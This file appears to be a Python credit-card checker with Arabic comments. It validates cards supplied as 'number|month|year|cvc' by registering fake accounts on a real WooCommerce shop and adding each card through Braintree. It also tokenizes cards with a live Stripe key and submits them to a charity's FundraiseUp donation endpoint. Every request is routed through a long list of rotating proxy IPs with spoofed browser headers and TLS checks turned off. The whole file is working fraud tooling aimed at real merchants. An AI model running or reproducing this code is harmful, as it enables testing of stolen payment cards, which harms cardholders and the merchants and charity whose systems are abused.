import os
import random

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import string

# قائمة البروكسيات التي أرسلتها
proxy_list = [
    "103.247.22.57:2022", "103.156.74.209:3125", "175.136.239.173:8181", "150.136.163.51:80",
    "103.75.119.185:80", "109.164.38.35:8080", "38.226.251.66:999", "190.181.29.114:999",
    "219.249.37.107:8197", "222.255.238.159:80", "77.240.97.77:8080", "41.111.206.167:80",
    "103.65.237.92:5678", "128.199.227.162:8080", "119.18.147.179:96", "223.205.96.43:8080",
    "47.91.29.151:4145", "202.47.185.153:8090", "65.108.103.19:80", "223.80.109.182:7302",
    "45.178.68.245:999", "82.115.60.51:80", "161.35.60.102:80", "41.169.135.242:8080",
    "45.174.168.44:999", "38.19.43.108:999", "94.46.172.104:80", "197.221.234.252:80",
    "185.212.195.34:8085", "84.241.30.38:8080", "170.82.52.223:8080", "174.138.119.88:80",
    "8.138.125.130:8080", "167.71.232.168:3000", "103.189.249.145:1111", "103.46.8.102:8080",
    "38.54.51.14:30001", "139.135.141.12:8095", "40.89.145.14:80", "180.191.21.49:8081",
    "102.0.25.184:8080", "112.2.3.162:2334", "148.66.6.211:80", "103.203.233.162:8080",
    "103.67.90.50:8081", "103.48.68.220:83", "103.191.196.96:8080", "103.188.168.69:8082",
    "121.127.42.146:80", "138.197.155.38:80", "193.176.242.186:80", "207.244.248.97:80",
    "112.198.128.171:8083", "202.21.106.35:8080", "182.253.111.12:80", "47.252.18.37:50",
    "190.97.239.24:999", "188.166.99.123:8081", "38.55.145.248:8888", "172.235.16.236:80",
    "101.200.158.109:8008", "36.37.180.40:8080", "45.169.169.14:8085", "39.102.213.50:8888",
    "191.101.1.116:80", "103.169.33.30:3125", "38.19.40.9:8083", "157.20.207.115:8080",
    "5.182.34.181:80", "186.31.135.202:999", "190.109.6.113:999", "115.239.234.43:7302",
    "109.122.195.16:80", "8.211.49.86:8085", "20.210.39.153:8561", "20.27.14.220:8561",
    "109.169.72.251:3389", "103.61.16.20:8780", "43.153.82.179:8888", "103.172.42.105:1111",
    "153.19.91.77:80", "38.156.238.68:999", "103.94.10.254:8080", "216.106.179.216:49579",
    "156.239.53.241:80", "157.15.67.49:8080", "62.68.48.22:8080", "91.98.86.26:8888",
    "8.219.110.88:80", "219.249.37.107:8380", "64.23.223.154:80", "47.96.42.36:80",
    "122.3.121.231:8082", "204.10.70.33:80", "103.231.236.235:8182", "219.112.242.119:8080",
    "203.192.199.158:8080", "103.46.11.92:8080", "47.238.203.170:50000", "81.91.139.76:80",
    "38.190.100.170:999", "190.185.112.58:999", "123.231.252.218:8080", "112.28.149.152:8443",
    "190.111.218.139:999", "82.180.132.69:80", "47.237.2.245:8081", "137.66.1.45:80",
    "103.191.171.158:8080", "186.116.148.52:8080", "203.95.196.77:8080", "172.237.73.24:80",
    "103.11.76.74:8081", "198.12.37.29:8080", "8.137.38.48:80", "8.138.133.207:8081",
    "180.211.179.126:8080", "140.245.99.105:7890", "123.0.18.42:10000", "89.167.124.218:8888",
    "120.27.14.145:80", "198.89.96.140:808", "77.221.158.175:3128", "39.104.27.89:8081",
    "85.221.247.110:80", "37.58.221.247:3128", "175.139.233.76:80", "148.66.6.210:80",
    "216.106.179.216:49284", "219.93.101.62:80", "45.127.56.194:83", "34.94.46.8:80",
    "49.13.51.71:80", "91.187.113.68:8080", "140.83.37.145:80", "103.126.86.101:8080",
    "132.145.127.51:80", "203.174.15.83:8080", "38.194.251.246:999", "152.200.200.217:999",
    "103.87.171.14:32650", "142.93.157.60:80", "145.239.196.123:80", "47.237.2.245:2002",
    "219.93.101.60:80", "8.220.204.215:4002", "178.212.144.7:80", "31.76.29.13:8080",
    "138.197.112.162:80", "47.252.18.37:808", "8.138.131.110:8080", "47.238.130.212:8004",
    "8.220.204.215:8080", "45.176.99.58:999", "219.249.37.107:8382", "139.99.95.120:8080",
    "185.235.16.12:80", "13.80.134.180:80", "203.130.23.250:8080", "188.215.245.235:80",
    "103.114.96.246:8080", "47.92.194.235:8080", "188.68.52.244:80", "38.210.201.144:999",
    "8.219.111.175:80", "143.198.135.176:80", "8.215.15.163:8443", "46.218.28.255:80",
    "172.200.72.48:80", "67.205.112.110:80", "122.52.234.54:8081", "156.67.214.232:80",
    "103.97.140.110:8080", "126.209.45.27:5050", "203.158.221.152:80", "197.221.234.253:80",
    "8.220.204.215:9080", "185.105.184.45:1110", "139.162.200.213:80", "37.59.110.239:8080",
    "31.43.191.118:80", "47.243.124.21:4040", "163.172.53.142:80", "207.248.108.129:20185",
    "8.215.15.163:5060", "122.52.213.104:8082", "157.15.40.250:7777", "51.161.16.116:80",
    "83.97.79.103:80", "222.252.144.246:8080", "190.94.212.247:999", "43.160.255.142:7890",
    "193.43.140.240:8080", "47.237.2.245:87", "16.163.88.228:80", "47.238.130.212:8080",
    "185.82.96.190:8724", "103.146.185.140:1111", "103.163.231.106:3127", "201.230.121.228:999",
    "103.74.144.4:83", "205.215.247.164:3128", "103.172.42.111:1111", "36.88.150.66:8080",
    "95.211.64.139:8888", "201.131.237.163:999", "103.170.22.44:8080", "5.182.34.162:80",
    "103.15.222.192:10002", "46.218.29.14:80", "116.63.130.30:30001", "49.0.253.51:8888",
    "38.211.24.242:8080", "3.19.97.90:80", "64.181.240.152:3128", "8.211.49.86:808",
    "223.78.91.7:7897", "190.103.205.253:9097", "206.245.131.160:80", "27.109.158.122:80",
    "43.229.254.221:8181", "185.135.69.34:80", "47.245.34.161:5566", "41.254.48.190:1976",
    "5.255.98.240:80", "38.76.138.130:999", "52.33.78.11:8080", "68.183.143.134:80",
    "115.84.248.140:8080", "190.14.224.244:999", "8.213.128.6:1234", "8.211.49.86:3333",
    "197.164.101.11:1976", "39.102.211.162:8090", "8.138.133.207:9098", "185.203.174.123:8080",
    "103.48.69.33:83", "103.134.242.121:8080", "47.243.50.83:8082", "101.200.158.109:80",
    "67.205.132.249:80", "8.219.97.248:80", "181.49.100.190:8080", "39.104.27.89:8008",
    "103.157.79.82:1111", "38.252.217.32:999", "47.251.87.199:45", "198.12.37.6:8080",
    "49.0.250.196:14265", "210.16.85.42:8080", "77.68.100.177:80", "47.121.183.107:20000",
    "212.58.132.5:8888", "119.59.101.111:80", "221.132.18.38:80", "103.22.173.77:1111",
    "216.106.179.216:49507", "38.253.88.242:999", "8.213.128.6:83", "131.222.249.38:8080",
    "103.145.34.153:1111", "103.137.218.113:83", "5.182.34.245:80", "39.104.27.89:8004",
    "97.74.87.226:80", "113.160.235.248:19132", "154.73.28.49:8080", "103.133.27.239:8080",
    "49.149.121.249:8081", "45.167.23.30:999", "178.18.241.49:80", "8.215.15.163:8081",
    "8.213.128.6:3129", "110.238.116.82:8015", "41.220.22.7:80", "101.200.158.109:9200",
    "47.251.87.199:3129", "103.235.181.245:8080", "204.57.112.5:80", "221.153.92.39:80",
    "47.104.28.135:8008", "195.26.224.135:80", "139.162.197.36:80", "103.76.91.65:8080",
    "197.221.249.196:80", "18.138.102.128:3128", "190.14.240.133:999", "45.183.11.194:8080",
    "185.113.139.149:3128", "46.35.9.110:80", "103.137.158.112:83", "50.21.190.20:80",
    "45.71.114.154:999", "47.104.27.249:8080", "212.252.71.20:8080", "51.178.142.1:80",
    "51.255.82.124:80", "39.102.213.50:34567", "216.106.179.216:49532", "47.238.130.212:8888",
    "165.138.86.202:8080", "186.182.6.191:3129", "106.0.168.138:8080", "14.241.231.13:8080",
    "103.217.179.216:8080", "47.104.28.135:8888", "185.226.195.249:2222", "82.137.90.253:80",
    "103.17.215.9:8089", "135.87.39.23:443", "2.56.206.46:80", "43.130.231.201:8080",
    "217.182.195.221:30003", "159.194.228.40:8888", "46.55.143.145:8080", "36.91.220.133:8080",
    "103.240.7.94:42388", "185.174.208.195:8080", "82.210.56.251:80", "185.225.204.5:3128",
    "161.35.49.68:80", "170.245.132.82:9000", "147.185.162.27:8080", "216.117.195.93:80",
    "192.145.228.209:8082", "210.5.93.253:8080", "103.116.82.149:8080", "91.217.179.174:8080",
    "181.204.81.178:999", "47.121.183.107:80", "1.234.23.159:80", "58.69.248.180:8080",
    "5.182.34.105:80", "197.221.249.199:80", "34.81.160.132:80", "218.252.192.228:80",
    "195.57.239.25:8080", "103.237.102.191:11111", "47.121.183.107:9999", "103.69.151.189:8080",
    "103.76.149.66:8080", "185.214.39.2:9944", "31.148.207.153:80", "210.87.125.57:8080",
    "203.161.52.193:80", "83.219.97.48:8080", "190.8.164.245:999", "194.28.181.130:80",
    "137.184.100.135:80", "181.78.17.131:999", "183.109.79.187:80", "5.182.34.168:80",
    "138.197.208.93:8080", "202.29.215.78:8080", "103.48.71.114:83", "200.95.184.62:999",
    "103.156.15.14:8080", "213.131.85.27:1981", "94.74.80.88:9090", "103.179.46.49:6789",
    "36.50.253.66:8080", "220.116.142.217:80", "49.7.11.187:80", "39.102.208.149:3128",
    "103.171.232.96:8080", "135.87.39.23:9443", "34.44.49.215:80", "47.113.219.226:9090",
    "68.183.185.62:80", "38.9.201.18:999", "182.253.62.65:8080", "45.10.163.12:80",
    "192.3.99.221:8888", "112.118.187.149:8080", "45.43.60.220:8080", "200.107.239.218:999",
    "23.228.86.236:8081", "8.134.149.133:9080", "38.44.17.142:999", "20.210.39.155:8561",
    "46.62.189.77:8888", "41.220.16.209:80", "38.224.150.94:999", "175.34.36.22:8888",
    "119.92.236.184:8082", "160.25.223.14:8181", "202.179.93.132:58080", "129.226.93.232:80",
    "39.102.214.199:7777", "49.0.246.130:443", "202.21.115.178:8080", "122.2.48.121:8080",
    "41.220.16.213:80", "195.201.40.3:80", "177.152.98.130:8080", "43.252.214.195:80",
    "165.232.97.74:80", "80.74.54.148:3128", "197.164.101.14:1981", "8.211.194.78:8081",
    "66.76.76.60:80", "219.65.73.81:80", "39.102.211.64:8080", "191.252.222.91:80",
    "47.104.28.135:9080", "101.200.158.109:8880", "79.110.200.27:8000", "193.43.140.85:8080",
    "159.65.245.255:80", "193.68.115.14:8080", "212.32.235.131:80", "37.230.57.112:999",
    "120.26.104.146:80", "222.127.55.155:8082", "196.1.93.16:80", "181.48.162.142:999",
    "95.211.174.135:3128", "129.151.239.175:8080", "181.78.203.3:999", "165.99.194.32:8085",
    "31.24.154.42:80", "103.51.223.133:8080", "185.244.84.1:8080", "20.27.11.248:8561",
    "8.138.131.110:8008", "133.125.38.119:80", "52.229.30.3:80", "114.9.55.102:1111",
    "200.123.27.123:999", "8.219.167.110:8082", "39.102.214.199:3128", "47.254.153.78:8024",
    "103.134.1.14:8080", "78.28.152.111:80", "120.78.229.212:80", "8.212.168.170:8443",
    "148.66.6.213:80", "131.222.251.92:8080", "159.65.174.190:80", "41.184.92.220:80",
    "47.104.27.249:3128", "38.19.36.194:999", "5.182.34.15:80", "182.253.73.130:80",
    "157.20.244.77:8080", "182.72.203.255:80", "51.75.206.209:80", "47.251.87.199:8008",
    "195.26.230.202:8080", "45.229.30.65:11211", "202.133.88.173:80", "141.147.9.254:80",
    "39.102.211.162:8080", "110.5.113.227:80", "65.0.206.16:80", "45.168.236.54:3128",
    "121.43.109.88:8047", "14.170.154.193:19132", "121.43.109.88:80", "121.101.131.244:8080",
    "122.52.108.244:8082", "38.75.80.32:999", "103.153.62.242:8181", "116.68.172.170:8080",
    "149.172.228.226:80", "34.43.46.91:80", "5.182.34.237:80", "160.25.174.252:8080",
    "45.224.22.63:999", "131.222.251.90:8080", "5.182.34.122:80", "103.227.186.61:6080",
    "145.236.157.160:8080", "120.28.192.179:5050", "104.248.207.60:80", "124.217.5.100:5050",
    "8.138.131.110:3128", "47.250.155.254:8443", "39.102.211.162:10002", "38.156.23.38:999",
    "106.52.215.138:7890", "181.225.77.101:9992"
]

def get_random_proxy():
    if not proxy_list:
        return None
    p = random.choice(proxy_list)
    return {
        "http": f"http://{p}",
        "https": f"http://{p}"
    }


def Tele(ccx):
	ccx = ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
	r = requests.session()
	r.follow_redirects = True
	r.verify = False

	def generate_full_name():
		first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
					   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
					   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
					   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Rasha",
					   "Majid", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
					   "Ali", "Yasmin", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Eman", "Salma"]
		last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
					  "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
					  "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar"]
		full_name = random.choice(first_names) + " " + random.choice(last_names)
		return full_name.split()[0], full_name.split()[1]
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]
		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]
		return city, state, street_address, zip_code
			
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
		return f"{name}{number}@gmail.com"
	acc = generate_random_account()
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
		return f"{name}{number}"
	username_val = username()
			
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	}
	 
	try:
		response = r.get('https://www.thevacuumfactory.com/my-account/', headers=headers, proxies=get_random_proxy(), timeout=15)
		register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
	except Exception:
		return "Error Proxy/Connection"
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	}
	 
	data = {
	     'username': username_val,
	     'email': acc,
	     'password': 'Ah2002Ah!',
	     'woocommerce-register-nonce': register,
	     '_wp_http_referer': '/my-account/',
	     'register': 'Register',
	}
	 
	response = r.post('https://www.thevacuumfactory.com/my-account/', headers=headers, data=data, proxies=get_random_proxy(), timeout=15)
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	}
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, proxies=get_random_proxy(), timeout=15)
	try:
		address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
	except:
		return "Error Nonce"
	
	headers = {
	    'authority': 'www.thevacuumfactory.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.thevacuumfactory.com',
	    'referer': 'https://www.thevacuumfactory.com/my-account/edit-address/billing/',
	    'user-agent': user,
	}
	
	data = {
	    'billing_first_name': first_name,
	    'billing_last_name': last_name,
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': street_address,
	    'billing_address_2': '',
	    'billing_city': city,
	    'billing_state': state,
	    'billing_postcode': zip_code,
	    'billing_phone': '5032580987',
	    'billing_email': acc,
	    'save_address': 'Save address',
	    'woocommerce-edit-address-nonce': address,
	    '_wp_http_referer': '/my-account/edit-address/billing/',
	    'action': 'edit_address',
	}
	
	response = r.post('https://www.thevacuumfactory.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data, proxies=get_random_proxy(), timeout=15)
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'pragma': 'no-cache',
	     'user-agent': user,
	}
	 
	response = r.get('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, proxies=get_random_proxy(), timeout=15)
	try:
		add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	except:
		return "Error Token"
	 
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	}
	  
	data = {
	      'action': 'wc_braintree_credit_card_get_client_token',
	      'nonce': client,
	}
	  
	response = r.post('https://www.thevacuumfactory.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, proxies=get_random_proxy(), timeout=15)
	try:
		enc = response.json()['data']
		dec = base64.b64decode(enc).decode('utf-8')
		au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
	except:
		return "Error Auth"
	  
	headers = {
	      'authority': 'payments.braintree-api.com',
	      'accept': '*/*',
	      'authorization': f'Bearer {au}',
	      'braintree-version': '2018-05-10',
	      'cache-control': 'no-cache',
	      'content-type': 'application/json',
	      'pragma': 'no-cache',
	      'user-agent': user,
	}
	  
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'a8a54511-3469-4ac4-aae6-1b4ce202e438',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	try:
		response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, proxies=get_random_proxy(), timeout=15)
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		return "Error Tokenizing"
	  
	headers = {
	     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	     'cache-control': 'no-cache',
	     'content-type': 'application/x-www-form-urlencoded',
	     'pragma': 'no-cache',
	     'user-agent': user,
	}
	  
	data = {
	      'payment_method': 'braintree_credit_card',
	      'wc-braintree-credit-card-card-type': 'master-card',
	      'wc-braintree-credit-card-3d-secure-enabled': '',
	      'wc-braintree-credit-card-3d-secure-verified': '',
	      'wc-braintree-credit-card-3d-secure-order-total': '0.00',
	      'wc_braintree_credit_card_payment_nonce': tok,
	      'wc_braintree_device_data': '',
	      'wc-braintree-credit-card-tokenize-payment-method': 'true',
	      'woocommerce-add-payment-method-nonce': add_nonce,
	      '_wp_http_referer': '/my-account/add-payment-method/',
	      'woocommerce_add_payment_method': '1',
	}
	  
	response = r.post('https://www.thevacuumfactory.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data, proxies=get_random_proxy(), timeout=15)
	text = response.text
	pattern = r'Status code (.*?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if any(x in result.lower() for x in ['funds', 'added', 'charged', 'avs', 'postal', 'approved', 'nice!', 'cvv: gateway rejected: cvv', 'duplicate', 'successful', 'authentication required', 'thank you', 'confirmed', 'successfully', 'invalid_billing_address']):
		return 'Approved'
	else:
		return result


# --- البوابة الثانية (Stripe عبر FundraiseUp) مع دعم البروكسي ---
def stripe(ccx):
	ccx = ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	
	if int(yy) < 2000:
		yy = "20" + yy

	user = user_agent.generate_user_agent()

	headers_pm = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': user,
	}

	data_pm = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b14b1ce-a85e-49d8-ac17-4780a5c9798a62d04e&muid=03d149d5-2e89-4baa-b99e-1b1213718cfa487eb3&sid=cdebe41d-9724-492b-bd3d-2512ed4f0215aa032d&pasted_fields=number&payment_user_agent=stripe.js%2F09b245ec49%3B+stripe-js-v3%2F09b245ec49%3B+split-card-element&referrer=https%3A%2F%2Fwww.who.foundation&time_on_page=43545&client_attribution_metadata[client_session_id]=14cab750-14d6-4cb2-8f5d-e3fdb9404331&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=5f78af73-6d70-4515-978e-121519ceb57f&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_1IkRAxH3ux3KMQYE&_stripe_version=2026-02-25.clover'

	try:
		# إرسال الطلب الأول لـ Stripe باستخدام بروكسي عشوائي
		res_pm = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_pm, data=data_pm, proxies=get_random_proxy(), timeout=15)
		pm_json = res_pm.json()
		pm_id = pm_json.get('id')
		card_info = pm_json.get('card', {})
		last4 = card_info.get('last4', n[-4:])
		brand = card_info.get('brand', 'unknown')
		country = card_info.get('country', 'US')
		exp_m = card_info.get('exp_month', int(mm))
		exp_y = card_info.get('exp_year', int(yy))
	except Exception as e:
		return f"Error creating PM: {str(e)}"

	if not pm_id:
		err_msg = pm_json.get('error', {}).get('message', 'Declined')
		return err_msg

	headers_pay = {
		'authority': 'api.fundraiseup.com',
		'accept': '*/*',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		'content-type': 'text/plain; charset=utf-8',
		'origin': 'https://www.who.foundation',
		'referer': 'https://www.who.foundation/',
		'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': user,
	}

	json_data = {
		"paymentMethod": {
			"id": pm_id,
			"object": "payment_method",
			"allow_redisplay": "unspecified",
			"billing_details": {
				"address": {"city": None, "country": None, "line1": None, "line2": None, "postal_code": None, "state": None},
				"email": None,
				"name": None,
				"phone": None,
				"tax_id": None
			},
			"card": {
				"brand": brand,
				"brand_product": None,
				"checks": {"address_line1_check": None, "address_postal_code_check": None, "cvc_check": None},
				"country": country,
				"display_brand": brand,
				"exp_month": exp_m,
				"exp_year": exp_y,
				"funding": "debit",
				"generated_from": None,
				"last4": last4,
				"networks": {"available": [brand], "preferred": None},
				"regulated_status": "unregulated",
				"three_d_secure_usage": {"supported": True},
				"wallet": None
			},
			"created": int(time.time()),
			"customer": None,
			"customer_account": None,
			"livemode": True,
			"radar_options": {},
			"shared_payment_granted_token": None,
			"type": "card"
		},
		"embedVersion": "260812-1504"
	}

	try:
		# إرسال طلب الدفع لـ FundraiseUp باستخدام بروكسي عشوائي أيضاً
		res_pay = requests.post('https://api.fundraiseup.com/paymentSession/9913245918390649216/pay', headers=headers_pay, json=json_data, proxies=get_random_proxy(), timeout=15)
		response_text = res_pay.text
		
		if any(x in response_text.lower() for x in ['success', 'successfully', 'thank you', 'thanks', 'approved', 'fund', 'succeeded']):
			return 'Approved'
		else:
			return response_text[:100]
	except Exception as e:
		return f"Error: {str(e)}"
